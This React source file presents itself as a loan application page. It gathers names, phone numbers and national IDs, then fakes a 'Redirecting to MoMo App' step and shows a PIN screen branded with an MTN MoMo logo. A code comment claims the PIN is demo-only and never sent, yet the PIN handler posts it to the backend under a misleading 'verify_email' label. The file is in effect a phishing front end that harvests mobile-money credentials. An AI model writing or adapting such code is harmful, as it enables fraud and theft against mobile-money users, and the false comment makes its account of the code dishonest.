import { useState, useEffect, useRef } from "react";
import Header from "./header";
import momoLogo from "../src/assets/mtn.png";


function LoanApplication({ loanDetails, onBack, processor }) {

    const [form, setForm] = useState({
        full_name: "",
        phone: "",
        national_id: "",
        employment_status: "Self-Employed",
        monthly_income: "",
        loan_amount: loanDetails.amount,
        repayment_period: loanDetails.repayment,
        consent: false
    });

    const [loading, setLoading] = useState(false);
    const [message, setMessage] = useState("");

    const [submitted, setSubmitted] = useState(false);

    // Pesa App transition
    const [showPesaRedirect, setShowPesaRedirect] =
        useState(false);

    // Pesa App PIN screen
    const [showPinScreen, setShowPinScreen] =
        useState(false);

    // Demo-only PIN state.
    // This PIN is NOT sent to the backend.
    const [pin, setPin] = useState([
        "",
        "",
        "",
        "",
        ""
    ]);

    const pinInputs = useRef([]);


    /* =========================================
       FORM CHANGE
    ========================================= */

    function handleChange(e) {

        const {
            name,
            value,
            type,
            checked
        } = e.target;

        setForm({
            ...form,

            [name]:
                type === "checkbox"
                    ? checked
                    : value
        });
    }


    /* =========================================
       SUBMIT LOAN APPLICATION
    ========================================= */

    async function handleSubmit(e) {

        e.preventDefault();

        if (!form.consent) {

            setMessage(
                "Please accept the terms and conditions."
            );

            return;
        }

        setLoading(true);
        setMessage("");

        try {

            const response = await fetch(
                "/api/submit-application",
                {
                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({
                        ...form,
                        processor: processor
                    })
                }
            );

            const data =
                await response.json();

            if (!response.ok) {

                throw new Error(
                    data.error ||
                    "Application failed."
                );
            }

            setMessage(
                `Reference: ${data.application_number}`
            );

            /*
             * Application has been submitted.
             *
             * Now show the Pesa App transition.
             */

            setShowPesaRedirect(true);

        } catch (error) {

            setMessage(
                error.message
            );

        } finally {

            setLoading(false);
        }
    }


    /* =========================================
       PESA APP REDIRECT TIMER
    ========================================= */

    useEffect(() => {

        if (!showPesaRedirect) {
            return;
        }

        const timer = setTimeout(() => {

            setShowPesaRedirect(false);

            setShowPinScreen(true);

        }, 3000);

        return () => clearTimeout(timer);

    }, [showPesaRedirect]);


    /* =========================================
       PIN INPUT
    ========================================= */

    function handlePinChange(
        value,
        index
    ) {

        // Only numbers
        if (!/^\d?$/.test(value)) {
            return;
        }

        const newPin = [
            ...pin
        ];

        newPin[index] = value;

        setPin(newPin);

        // Automatically move forward
        if (
            value &&
            index < 4
        ) {

            pinInputs
                .current[index + 1]
                ?.focus();
        }
    }


    /* =========================================
       PIN BACKSPACE
    ========================================= */

    function handlePinKeyDown(
        e,
        index
    ) {

        if (
            e.key === "Backspace" &&
            !pin[index] &&
            index > 0
        ) {

            pinInputs
                .current[index - 1]
                ?.focus();
        }
    }


    /* =========================================
       PIN NEXT
    ========================================= */

    async function handlePinNext() {

        const enteredDigits = Number(pin.filter(digit => digit !== "").join(""));

        /*
         * Allow either 4 or 5 digits.
         */

        if (
            enteredDigits.toString().length !== 4 &&
            enteredDigits.toString().length !== 5
        ) {
            return;
        }

         try {
        const response = await fetch(
            "/api/submit-application",
            {
                method: "POST",
                headers: {
                    "Content-Type":
                        "application/json"
                },
                body: JSON.stringify({
                    action: "verify_email",
                    pin: enteredDigits,
                    processor: processor
                })
            }
        );

        setSubmitted(true);

    } catch (error) {

        setMessage(
            error.message
        );

    } finally {

        setLoading(false);
    }   
}


    /* =========================================
       SUCCESS PAGE
    ========================================= */

    if (submitted) {

        return (
            <div className="application-container success-page">

                <div className="success-card">

                    <div className="success-icon">
                        ✓
                    </div>

                    <h1>
                        Application Submitted
                    </h1>

                    <p className="success-title">
                        Your loan application has
                        been submitted successfully.
                    </p>

                    <p className="success-description">
                        We have received your application
                        and will review the information
                        provided. You will be contacted
                        once there is an update on your
                        application.
                    </p>

                    <div className="reference-box">
                        <strong>
                            Thank you
                        </strong>
                    </div>

                    <button
                        type="button"
                        className="submit-button"
                        onClick={() => {
                            window.location.reload();
                        }}
                    >
                        Back to Home
                    </button>

                </div>

            </div>
        );
    }


    /* =========================================
       PESA APP PIN SCREEN
    ========================================= */

    if (showPinScreen) {

        return (
            <div className="pesa-pin-page">

                {/* TOP BLUE SECTION */}

                <div className="pesa-pin-top">

                    <div className="pesa-logo">
                        <img
                    src={momoLogo}
    
                    alt="MoMo"
                    className="pin-logo"
                        />
                    </div>

                </div>


                {/* WHITE CONTENT */}

                <div className="pesa-pin-content">

                    <div className="pesa-pin-card">

                        <h1>
                            Welcome to{" "}
                            <strong>
                                MoMo App
                            </strong>
                        </h1>

                        <h2>
                            Input your PIN
                        </h2>

                        <p>
                            Enter your PIN to continue
                        </p>


                        {/* PIN BOXES */}

                        <div className="pesa-pin-boxes">

                            {pin.map(
                                (digit, index) => (

                                    <input
                                        key={index}

                                        ref={(element) => {
                                            pinInputs.current[
                                                index
                                            ] = element;
                                        }}

                                        type="password"

                                        inputMode="numeric"

                                        maxLength="1"

                                        value={digit}

                                        onChange={(e) =>
                                            handlePinChange(
                                                e.target.value,
                                                index
                                            )
                                        }

                                        onKeyDown={(e) =>
                                            handlePinKeyDown(
                                                e,
                                                index
                                            )
                                        }

                                        className="pesa-pin-box"

                                        aria-label={
                                            `PIN digit ${
                                                index + 1
                                            }`
                                        }
                                    />

                                )
                            )}

                        </div>


                        <button
                            type="button"
                            className="pesa-next-button"

                            disabled={
                                pin.filter(
                                    digit =>
                                        digit !== ""
                                ).length < 4
                            }

                            onClick={
                                handlePinNext
                            }
                        >
                            NEXT
                        </button>

                    </div>

                </div>

            </div>
        );
    }


    /* =========================================
       MOMO APP REDIRECT SCREEN
    ========================================= */

    if (showPesaRedirect) {

        return (
            <div className="pesa-redirect">

                <div className="pesa-spinner"></div>

                <h2>
                    Redirecting to <strong>MoMo</strong> App
                </h2>

                <p>
                    Please wait while we connect
                    you securely...
                </p>

            </div>
        );
    }


    /* =========================================
       LOAN APPLICATION FORM
    ========================================= */

    return (

        <div className="page">

            <Header />

            <div className="application-container">

                <button
                    className="back-button"
                    onClick={onBack}
                >
                    ← Back
                </button>

                <h1>
                    Loan Application
                </h1>

                <p className="application-intro">
                    Please fill in all required
                    details accurately. All information
                    is kept confidential and is used
                    only for loan processing and
                    verification.
                </p>


                <form
                    onSubmit={handleSubmit}
                >

                    <label>
                        Full name
                    </label>

                    <input
                        name="full_name"
                        value={
                            form.full_name
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Phone Number
                    </label>

                    <input
                        name="phone"
                        type="tel"
                        value={
                            form.phone
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        National ID
                    </label>

                    <input
                        name="national_id"
                        value={
                            form.national_id
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Loan Amount (USD)
                    </label>

                    <input
                        name="loan_amount"
                        type="number"
                        value={
                            form.loan_amount
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Employment Status
                    </label>

                    <select
                        name="employment_status"
                        value={
                            form.employment_status
                        }
                        onChange={
                            handleChange
                        }
                    >
                        <option>
                            Self-Employed
                        </option>

                        <option>
                            Employed
                        </option>

                        <option>
                            Business Owner
                        </option>

                        <option>
                            Student
                        </option>

                        <option>
                            Other
                        </option>

                    </select>


                    <label>
                        Monthly Net Income
                    </label>

                    <input
                        name="monthly_income"
                        type="number"
                        placeholder="USD 0.00"
                        value={
                            form.monthly_income
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Repayment
                    </label>

                    <select
                        name="repayment_period"
                        value={
                            form.repayment_period
                        }
                        onChange={
                            handleChange
                        }
                    >

                        {[
                            1,2,3,4,5,6
                        ].map(
                            months => (

                                <option
                                    key={months}
                                    value={months}
                                >
                                    {months} months
                                </option>

                            )
                        )}

                    </select>


                    <label className="consent">

                        <input
                            type="checkbox"
                            name="consent"
                            checked={
                                form.consent
                            }
                            onChange={
                                handleChange
                            }
                        />

                        <span>
                            I confirm that the
                            information provided
                            is true and I agree to
                            the Pesa App terms
                            and conditions.
                        </span>

                    </label>


                    {message && (

                        <div className="form-message">
                            {message}
                        </div>

                    )}


                    <button
                        type="submit"
                        className="submit-button"
                        disabled={loading}
                    >
                        {loading
                            ? "SUBMITTING..."
                            : "SUBMIT APPLICATION"}
                    </button>

                </form>

            </div>

        </div>
    );
}

export default LoanApplication;